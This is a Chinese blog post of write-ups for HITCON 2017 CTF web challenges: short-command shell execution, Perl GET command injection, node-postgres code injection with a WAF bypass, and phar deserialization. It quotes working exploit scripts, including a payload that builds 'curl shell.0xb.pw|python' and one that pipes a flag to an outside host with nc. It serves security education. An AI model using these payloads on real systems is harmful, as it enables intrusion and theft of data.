---
title: HITCON2017-writeup整理
date: 2017-11-10 12:20:23
tags:
- ctf
---



由于最近HCTF2017就要开始了，投入了大量的精力来维护题目和测试平台，无奈刚好错过了HITCON的比赛，赛后花了大量的时间整理writeup，不得不说Orange在Web很多问题的底层溯源上领先了我一大截，下面分享我的writeup。

[orange公布的官方writeup](https://github.com/orangetw/My-CTF-Web-Challenges)

<!--more-->

# babyfirst-revenge #


```index.php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);

```

阅读代码可以发现几个问题，sanbox是相互独立的，可以算是每个用户都有独立的目录用来操作。其次我们可以执行5位以内的命令。

既然用户独立，那么就说明目录下我们可以通过多次命令执行来解决问题，这里就需要一个特别的技巧了。

[http://www.freebuf.com/articles/web/137923.html](http://www.freebuf.com/articles/web/137923.html)

文章的最下面提到了一种特别的利用方式，一般应用在可执行命令很少的情况

![image.png-45.6kB][1]

首先我们可以通过`>1`这样的方式来创建一个新的文件。

```
root@iZ285ei82c1Z:~/test# ls>1
root@iZ285ei82c1Z:~/test# cat 1
1
root@iZ285ei82c1Z:~/test# ls
1
```

甚至可以把命令输出到文件里

这里就有一个骚操作了，我们可以通过写入多个文件，来拼接命令，然后把ls结果输出到文件，再使用sh来执行文件。

```
root@iZ285ei82c1Z:~/test# echo 1
1
root@iZ285ei82c1Z:~/test# >\ 1\\
root@iZ285ei82c1Z:~/test# >ho\\
root@iZ285ei82c1Z:~/test# >ec\\
root@iZ285ei82c1Z:~/test# ls
 1\  ec\  ho\
root@iZ285ei82c1Z:~/test# ls -t
ec\  ho\   1\
root@iZ285ei82c1Z:~/test# ls -t>g
root@iZ285ei82c1Z:~/test# sh g
g: 1: g: g: not found
1
```

尽管报错了，但是还是执行了命令，需要注意的问题就是ls的结果是根据字母排序来，我们需要让ls使用-t指令来按照时间排序，才能获得我们想要的顺序。

那么回到题目，由于只有5位，我们没办法使用`ls -t>g`，那么我们首先遇到构造这样一条命令。

我们来看看orange给出的官方wp
```
import requests
from time import sleep
from urllib import quote

payload = [
    # generate `ls -t>g` file
    '>ls\\', 
    'ls>_', 
    '>\ \\', 
    '>-t\\', 
    '>\>g', 
    'ls>>_', 

    # generate `curl orange.tw.tw>python`
    # curl shell.0xb.pw|python
    '>on', 
    '>th\\', 
    '>py\\',
    '>\|\\', 
    '>pw\\', 
    '>x.\\',
    '>xx\\', 
    '>l.\\', 
    '>el\\', 
    '>sh\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 

    # exec
    'sh _', 
    'sh g', 
]



r = requests.get('http://xxx/web1.php/?reset=1')
for i in payload:
    assert len(i) <= 5 
    r = requests.get('http://xxx/web1.php/?cmd=' + quote(i) )
    print i
    sleep(0.2)
```

首先我们将命令按照相对分割。
```
>ls\\
>\ \\
>-t\\
>\>g
```

由于我们在这一步没办法通过写入时间来控制顺序，所以我们必须通过合理的分割方式和预写入来控制写入文件的内容。

成功写入`ls -t>g`之后,我们只需要按顺序来写入反弹shell的命令就可以了。


# babyfirst-revenge v2 #

```
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);

```
这题是上一题的进化版，把5位限制改成了4位，这里出现的最大的问题就是我们没办法解决`ls -t>g`的问题。下面的办法也主要是为了解决这个问题。

如果我们简单的分割字符，我们没办法解决ls的顺序问题。

这里就到了八仙过海各显神通的时候了，orange官方放出的解法是通过逆序来解决。

这里我们需要构造一条`ls -t>g`，但是我们可以把命令进一步拓展，比如`ls -th>g`，这样一来，假设我们逆序分割。
```
dir
sl
g\>
ht-
```

这样以来我们可以确保命令的顺序，然后用`*`来把语句链接起来
```
root@iZ285ei82c1Z:~/test# ls
dir  g>  ht-  sl
root@iZ285ei82c1Z:~/test# *
g>  ht-  sl
```

然后逆序在输入文件
```
root@iZ285ei82c1Z:~/test# ls
dir  g>  ht-  sl
root@iZ285ei82c1Z:~/test# *>v
root@iZ285ei82c1Z:~/test# >rev
root@iZ285ei82c1Z:~/test# *v>x
root@iZ285ei82c1Z:~/test# cat x
ls  -th  >g
```

通过这种方式，我们就得到了我们想要的命令，后面的就没什么区别了。

# ssrfme #
```
<?php 
    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); 
    @mkdir($sandbox); 
    @chdir($sandbox); 

    $data = shell_exec("GET " . escapeshellarg($_GET["url"])); 
    $info = pathinfo($_GET["filename"]); 
    $dir  = str_replace(".", "", basename($info["dirname"])); 
    @mkdir($dir); 
    @chdir($dir); 
    @file_put_contents(basename($info["basename"]), $data); 
    highlight_file(__FILE__); 
```

这里的思路来自于@ricterZ的博客[https://ricterz.me/posts/HITCON%202017%20SSRFme](https://ricterz.me/posts/HITCON%202017%20SSRFme)

代码很简单，调用命令`GET`来执行从url获取的参数， 然后按照filename新建文件，写入GET的结果。

这里最关键的一点就是GET的命令执行漏洞，在说GET之前，首先需要知道perl的open可以执行命令。

我不知道关于这个问题最早是什么时候爆出的了，但确实已经很多年了。

[https://news.ycombinator.com/item?id=3943116](https://news.ycombinator.com/item?id=3943116)

```
root@iZ285ei82c1Z:~/test# cat a.pl 
open(FD, "|id");
print <FD>;
root@iZ285ei82c1Z:~/test# perl a.pl 
uid=0(root) gid=0(root) groups=0(root)
```

而perl里的GET函数底层就是调用了open处理
```
file.pm
84: opendir(D, $path) or
132:    open(F, $path) or return new
```

open函数本身还支持file协议
```
root@iZ285ei82c1Z:~/test# cat /usr/share/perl5/LWP.pm

...
=head2 File Request

The library supports GET and HEAD methods for file requests.  The
"If-Modified-Since" header is supported.  All other headers are
ignored.  The I<host> component of the file URL must be empty or set
to "localhost".  Any other I<host> value will be treated as an error.

Directories are always converted to an HTML document.  For normal
files, the "Content-Type" and "Content-Encoding" in the response are
guessed based on the file suffix.

Example:

  $req = HTTP::Request->new(GET => 'file:/etc/passwd');
...
```

综合看起来像是一个把文件名拼接入命令导致的命令执行。

我们可以测试一下
```
root@iZ285ei82c1Z:~/test# GET 'file:id|'
uid=0(root) gid=0(root) groups=0(root)
```

成功执行命令了，那么思路就清楚了，我们通过传入命令文件名和命令来
执行。

payload来自rr的博客
```
http://13.115.136.15/?url=file:bash%20-c%20/readflag|&filename=bash%20-c%20/readflag|
http://13.115.136.15/?url=file:bash%20-c%20/readflag|&filename=bash%20-c%20/readflag|
http://13.115.136.15/sandbox/c36eb1c4372f5f8131542751d486cebd/bash%20-c%20/readflag%7C
```

# sql so hard #

题目是nodejs的注入导致的命令执行漏洞，漏洞利用链非常精巧，首先我们需要了解一个漏洞，整个漏洞@Phith0n师傅发了很详细的分析

[https://paper.seebug.org/438/](https://paper.seebug.org/438/)

简单描述漏洞来说，在node-postgres里，执行完数据库查询语句，会返回数据的字段名字和数量，node后端会把字段的名字经过不完整的转义就拼接进入了Function类，导致了命令执行，这个命令执行在前端会导致xss，在后端就会导致命令执行。

这里的转义不完全指的就是，只转义了单引号，但是没转义反斜杠，导致可以传入`\'`，那么`\'`会变成`\\'`,单引号就逃逸出来了。

假设我们执行
```
sql = `SELECT 1 AS "\\'+console.log(process.env)]=null;//"`
```

那么传入Function的内容就是
```
this['\\'+console.log(process.env)]=null;//'] = rowData[0] == null ? null : parsers[0](rowData[0]);
```

前后都有相应的闭合，代码就被执行了。

那么我们回到题目里，代码如下：
```
#!/usr/bin/node

/**
 *  @HITCON CTF 2017
 *  @Author Orange Tsai
 */

const qs = require("qs");
const fs = require("fs");
const pg = require("pg");
const mysql = require("mysql");
const crypto = require("crypto");
const express = require("express");

const pool = mysql.createPool({
    connectionLimit: 100, 
    host: "localhost",
    user: "ban",
    password: "ban",
    database: "bandb",
});

const client = new pg.Client({
    host: "localhost",
    user: "userdb",
    password: "userdb",
    database: "userdb",
});
client.connect();

const KEYWORDS = [
    "select", 
    "union", 
    "and", 
    "or", 
    "\\", 
    "/", 
    "*", 
    " " 
]

function waf(string) {
    for (var i in KEYWORDS) {
        var key = KEYWORDS[i];
        if (string.toLowerCase().indexOf(key) !== -1) {
            return true;
        }
    }
    return false;
}

const app = express();
app.use((req, res, next) => {
   var data = "";
   req.on("data", (chunk) => { data += chunk})
   req.on("end", () =>{
       req.body = qs.parse(data);
       next();
   })
})


app.all("/*", (req, res, next) => {
    if ("show_source" in req.query) {
        return res.end(fs.readFileSync(__filename));
    }
    if (req.path == "/") {
        return next();
    }

    var ip = req.connection.remoteAddress;
    var payload = "";
    for (var k in req.query) {
        if (waf(req.query[k])) {
            payload = req.query[k];
            break;
        }
    }
    for (var k in req.body) {
        if (waf(req.body[k])) {
            payload = req.body[k];
            break;
        }
    }

    if (payload.length > 0) {
        var sql = `INSERT INTO blacklists(ip, payload) VALUES(?, ?) ON DUPLICATE KEY UPDATE payload=?`;
    } else {
        var sql = `SELECT ?,?,?`;
    }
    
    return pool.query(sql, [ip, payload, payload], (err, rows) => {
        var sql = `SELECT * FROM blacklists WHERE ip=?`;
        return pool.query(sql, [ip], (err,rows) => {
            if ( rows.length == 0) {
                return next();
            } else {
                return res.end("Shame on you");
            }
            
        });
    });

});


app.get("/", (req, res) => {
    var sql = `SELECT * FROM blacklists GROUP BY ip`;
    return pool.query(sql, [], (err,rows) => {
        res.header("Content-Type", "text/html");
        var html = "<pre>Here is the <a href=/?show_source=1>source</a>, thanks to Orange\n\n<h3>Hall of Shame</h3>(delete every 60s)\n";
        for(var r in rows) {
            html += `${parseInt(r)+1}. ${rows[r].ip}\n`;

        }
        return res.end(html);
    });

});

app.post("/reg", (req, res) => {
    var username = req.body.username;
    var password = req.body.password;
    if (!username || !password || username.length < 4 || password.length < 4) {
        return res.end("Bye");
    } 

    password = crypto.createHash("md5").update(password).digest("hex");
    var sql = `INSERT INTO users(username, password) VALUES('${username}', '${password}') ON CONFLICT (username) DO NOTHING`;
    return client.query(sql.split(";")[0], (err, rows) => {
        if (rows && rows.rowCount == 1) {
            return res.end("Reg OK");
        } else {
            return res.end("User taken");
        }
    });
});

app.listen(31337, () => {
    console.log("Listen OK");
});
```

题目很明显是上面提到的node+Postgres导致的命令执行漏洞，但是其中有几个条件不符：

1、由于注入点在username，但是根据分号分割，所以我们没办法多语句执行。
2、waf过滤了斜杠。

一般意义上来说，造成上面漏洞的原因是，查询结果的字段名被拼接进入了语句，而对于常见的mysql来说，insert语句是没有返回的，所以我们没办法控制命令注入。

但是在postgres sql中，存在RETURNING语法，文档中的描述是这样的。

```
INSERT INTO table [ ( column [, ...] ) ]
    { DEFAULT VALUES | VALUES ( { expression | DEFAULT } [, ...] ) [, ...] | query }
    [ RETURNING * | output_expression [ AS output_name ] [, ...] ]
    
    
If the INSERT command contains a RETURNING clause, the result will be similar to that of a SELECT statement containing the columns and values defined in the RETURNING list, computed over the row(s) inserted by the command.
```

既然我们可以控制返回，我们就可以构造像select一样的返回，这样我们就可以绕过第一部分。

紧接着就是第二个问题，由于构造payload一定要用到反斜杠，所以我们必须想办法解决黑名单的问题。

我们先来看看这部分的流程，如果在你的请求中带上了黑名单词，那么ip就会被加入黑名单中，然后判断数据库中存不存在你的ip，进入ban流程。

那么如果我们想办法在insert这步让他报错，那么后面的select就不会有结果。

这里经过测试，只有一个办法有用，当SQL语句超过16M就会触发错误，`max_allowed_packet`错误是因为mysql限制了最大数据包的大小，导致如果我们构造一个足够长的数据包，就会导致插入错误。

这里有个有趣的事情是，orange师傅分享说到为了方便选手做题，他设置了自动清空黑名单的数据库，但是正因为这种情况，有人尝试条件竞争来绕过了waf。（删除之后使代码经过插入到判断前，就可以绕过：>）

最后就是要想办法构造命令执行，这部分内容都来自于P神的博客。

在实际利用中，会有一些问题：
```
单双引号都不能正常使用，我们可以使用es6中的反引号

Function环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。

一个fieldName只能有64位长度，所以我们通过多个fieldName拼接来完成利用
```

最后贴上orange在github分享的exp

```
from random import randint
import requests

# payload = "union"
payload = """','')/*%s*/returning(1)as"\\'/*",(1)as"\\'*/-(a=`child_process`)/*",(2)as"\\'*/-(b=`/readflag|nc orange.tw 12345`)/*",(3)as"\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//"--""" % (' '*1024*1024*16)


username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535))
data = {
            'username': username+payload, 
                'password': 'AAAAAA'
                }
print 'ok'
r = requests.post('http://13.113.21.59:31337/reg', data=data);
print r.content
```

# baby^h-master-php-2017 #

这题是Orange出的一个0day...导致整场比赛中都没人做出来这题，虽然不能说有啥实战价值，但这完全是一个orange凭着对底层的理解找到的奇技淫巧，让我们来研究一下。

源码如下
```
<?php
    $FLAG    = create_function("", 'die(`/read_flag`);');
    $SECRET  = `/read_secret`;
    $SANDBOX = "/var/www/data/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); 
    @mkdir($SANDBOX);
    @chdir($SANDBOX);

    if (!isset($_COOKIE["session-data"])) {
        $data = serialize(new User($SANDBOX));
        $hmac = hash_hmac("sha1", $data, $SECRET);
        setcookie("session-data", sprintf("%s-----%s", $data, $hmac));
    }

    class User {
        public $avatar;
        function __construct($path) {
            $this->avatar = $path;
        }
    }

    class Admin extends User {
        function __destruct(){
            $random = bin2hex(openssl_random_pseudo_bytes(32));
            eval("function my_function_$random() {"
                ."  global \$FLAG; \$FLAG();"
                ."}");
            $_GET["lucky"]();
        }   
    }

    function check_session() {
        global $SECRET;
        $data = $_COOKIE["session-data"];
        list($data, $hmac) = explode("-----", $data, 2);
        if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac))
            die("Bye");
        if ( !hash_equals(hash_hmac("sha1", $data, $SECRET), $hmac) )
            die("Bye Bye");

        $data = unserialize($data);
        if ( !isset($data->avatar) )
            die("Bye Bye Bye");
        return $data->avatar;
    }

    function upload($path) {
        $data = file_get_contents($_GET["url"] . "/avatar.gif");
        if (substr($data, 0, 6) !== "GIF89a")
            die("Fuck off");
        file_put_contents($path . "/avatar.gif", $data);
        die("Upload OK");
    }

    function show($path) {
        if ( !file_exists($path . "/avatar.gif") )
            $path = "/var/www/html";
        header("Content-Type: image/gif");
        die(file_get_contents($path . "/avatar.gif"));
    }

    $mode = $_GET["m"];
    if ($mode == "upload")
        upload(check_session());
    else if ($mode == "show")
        show(check_session());
    else
        highlight_file(__FILE__); 
```

首先从代码里可以很清楚的看明白flag的获取方式。

1、flag在admin类里，如果能够反序列化就能触发析构函数获取flag。
2、`check_session`从cookie中读取了data，但是却经过了`hash_hmac`，这是二进制层面的对比，完全没办法绕过。

所以第一个难关就是怎么构造一个反序列化。

**这里是个0day...网上搜不到任何相关信息**

**php在解析phar对象的时候会反序列化metadata**

在[https://rdot.org/forum/showthread.php?t=4379](https://rdot.org/forum/showthread.php?t=4379)提到了一段测试代码

```
<?php

if(count($argv) > 1) {
    @readfile("phar://./deser.phar");
    exit;
}

class Hui {
    function __destruct() {
        echo "PWN\n";
    }
}

@unlink('deser.phar');
try {
    $p = new Phar(dirname(__FILE__) . '/deser.phar', 0);
    $p['file.txt'] = 'test';
    $p->setMetadata(new Hui());
    $p->setStub('<?php __HALT_COMPILER(); ?>');
} catch (Exception $e) {
    echo 'Could not create and/or modify phar:', $e;
}

?>
```

从phar.c的底层代码我们可以看到这部分操作

[https://github.com/php/php-src/blob/238916b5c9b7d09a711aad5656710eb4d1a80518/ext/phar/phar.c#L609](https://github.com/php/php-src/blob/238916b5c9b7d09a711aad5656710eb4d1a80518/ext/phar/phar.c#L609)

![image.png-72.4kB][2]

当使用`phar://`协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化。这样我们就能构造一个我们想要的admin类了

这样我们就可以通过文件读取漏洞实现一个反序列化漏洞了。

这里poc来自于p师傅的小密圈@代码审计

```
<?php
class Admin {
	public $avatar = 'orz';  
} 
$p = new Phar(__DIR__ . '/avatar.phar', 0);
$p['file.php'] = '<?php ?>';
$p->setMetadata(new Admin());
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
rename(__DIR__ . '/avatar.phar', __DIR__ . '/avatar.gif');
?>
```

当我们能够获取一个反序列化的admin对象之后，我们遇到了新的问题。

```
$FLAG    = create_function("", 'die(`/read_flag`);');
```

获取flag的函数是通过`create_function`，并没有设置函数名字，但其实这里声明的函数是有函数名的，匿名函数会被设置为`\x00lambda_%d`，这里的%d是顺序递增的。

我们仍然可以从php的源码里找到这个问题

[https://github.com/php/php-src/blob/d56a534acc52b0bb7d61ac7c3386ab96e8ca4a97/Zend/zend_builtin_functions.c#L1914](https://github.com/php/php-src/blob/d56a534acc52b0bb7d61ac7c3386ab96e8ca4a97/Zend/zend_builtin_functions.c#L1914)

```
		do {
			ZSTR_LEN(function_name) = snprintf(ZSTR_VAL(function_name) + 1, sizeof("lambda_")+MAX_LENGTH_OF_LONG, "lambda_%d", ++EG(lambda_count)) + 1;
		} while (zend_hash_add_ptr(EG(function_table), function_name, func) == NULL);
		RETURN_NEW_STR(function_name);
	} else {
		zend_hash_str_del(EG(function_table), LAMBDA_TEMP_FUNCNAME, sizeof(LAMBDA_TEMP_FUNCNAME)-1);
		RETURN_FALSE;
```

这里的%d会一直递增到最大长度直到结束，这里我们可以通过大量的请求来迫使Pre-fork模式启动的Apache启动新的线程，这样这里的%d会刷新为1，就可以预测了。

在orange公布的writeup中可以得到它使用的脚本以及exp
```
# get a cookie
$ curl http://host/ --cookie-jar cookie

# download .phar file from http://orange.tw/avatar.gif
$ curl -b cookie 'http://host/?m=upload&url=http://orange.tw/'

# force apache to fork new process
$ python fork.py &

# get flag
$ curl -b cookie "http://host/?m=upload&url=phar:///var/www/data/$MD5_IP/&lucky=%00lambda_1"
```



  [1]: http://static.zybuluo.com/LoRexxar/c1c9vp7cvb2z2ausx5biqr84/image.png
  [2]: http://static.zybuluo.com/LoRexxar/u3360luwi2cwwqdsukt59ckv/image.png